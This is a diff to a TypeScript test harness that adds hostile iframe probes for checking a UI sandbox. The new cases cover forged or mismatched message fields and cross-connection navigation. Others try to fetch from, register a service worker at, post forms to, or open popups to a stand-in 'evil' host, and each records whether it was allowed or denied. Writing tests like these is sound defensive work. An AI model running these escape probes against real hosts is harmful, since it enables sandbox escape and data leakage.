@@ -1,4 +1,4 @@
-export const FRAME_ATTACKS = ["good", "editor-change", "editor-propose", "mismatch", "throw", "forged", "replay", "ambient", "navigate", "before-load", "remote", "data", "blob", "redirect", "image", "font", "style", "worker", "service-worker", "parent", "form", "popup", "download", "top"] as const;
+export const FRAME_ATTACKS = ["good", "editor-change", "editor-propose", "late-revoke", "mismatch", "throw", "forged", "replay", "wrong-release", "wrong-generation", "wrong-connection", "unknown-field", "before-ready", "cross-connection", "ambient", "navigate", "before-load", "remote", "data", "blob", "redirect", "fetch", "image", "font", "style", "worker", "service-worker", "parent", "form", "popup", "download", "top"] as const;
 export type FrameAttack = typeof FRAME_ATTACKS[number];
 
 function hostileUi(attack: FrameAttack, evil: string): void {
@@ -41,17 +41,28 @@ function hostileUi(attack: FrameAttack, evil: string): void {
         switch (attack) {
           case "forged": send("ui:resize", { height: 1 }, { instance: "0".repeat(32) }); break;
           case "replay": send("ui:resize", { height: 1 }, { seq: 1 }); break;
+          case "wrong-release": send("ui:resize", { height: 1 }, { releaseDigest: "0".repeat(64) }); break;
+          case "wrong-generation": send("ui:resize", { height: 1 }, { generationId: "cached-generation" }); break;
+          case "wrong-connection": send("ui:resize", { height: 1 }, { connectionId: "connection-other" }); break;
+          case "unknown-field": send("ui:resize", { height: 1 }, { callback: "execute" }); break;
+          case "cross-connection": send("ui:navigate", { target: { kind: "object", ref: { adapterId: init.adapterId, connectionId: "connection-other", objectType: "task", canonicalId: "foreign" } } }); break;
           case "ambient": parent.postMessage({ ...init, seq: 3, type: "action:propose", body: { draftId: "forged", revision: 1 } }, "*"); break;
           case "navigate": location.reload(); break;
           case "remote": location.assign(evil + "/remote"); break;
           case "data": location.assign("data:text/html,hostile-navigation"); break;
           case "blob": location.assign(URL.createObjectURL(new Blob(["hostile"], { type: "text/html" }))); break;
           case "redirect": location.assign(new URL("redirect.html", location.href).href); break;
+          case "fetch": void fetch(evil + "/fetch").then(() => report("fetch-allowed"), () => report("fetch-denied")); break;
           case "image": img(); break;
           case "font": { const font = new FontFace("beacon", `url(${evil}/font)`); void font.load().catch(() => report("font-denied")); break; }
           case "style": { const link = document.createElement("link"); link.rel = "stylesheet"; link.href = evil + "/style"; document.head.append(link); break; }
-          case "worker": new Worker(URL.createObjectURL(new Blob([`fetch(${JSON.stringify(evil)})`], { type: "text/javascript" }))); break;
-          case "service-worker": void navigator.serviceWorker.register(evil + "/service-worker.js").catch(() => report("service-worker-denied")); break;
+          case "worker": {
+            const worker = new Worker(URL.createObjectURL(new Blob([`postMessage('running');fetch(${JSON.stringify(evil)})`], { type: "text/javascript" })));
+            worker.onmessage = () => report("worker-allowed");
+            worker.onerror = () => report("worker-denied");
+            break;
+          }
+          case "service-worker": void navigator.serviceWorker.register(evil + "/service-worker.js").then(() => report("service-worker-allowed"), () => report("service-worker-denied")); break;
           case "parent": { const p = parent.document; p.body.dataset.compromised = "yes"; break; }
           case "form": { const form = document.createElement("form"); form.action = evil + "/form"; form.method = "POST"; document.body.append(form); form.submit(); break; }
           case "popup": window.open(evil + "/popup"); break;
@@ -59,10 +70,12 @@ function hostileUi(attack: FrameAttack, evil: string): void {
           case "top": top!.location.href = evil + "/top"; break;
           default: break;
         }
-      } catch (error) { report(error instanceof Error ? error.name : "denied"); }
+      } catch (error) { report(`${attack}-denied`); report(error instanceof Error ? error.name : "denied"); }
     };
     port.start();
-    send("ui:ready", init.body, attack === "mismatch" ? { version: "2.0.0" } : {});
+    if (attack === "mismatch" || attack === "before-ready" || attack === "late-revoke") report(attack);
+    if (attack === "before-ready") send("ui:resize", { height: 1 });
+    else send("ui:ready", init.body, attack === "mismatch" ? { version: "2.0.0" } : {});
   });
 }
 
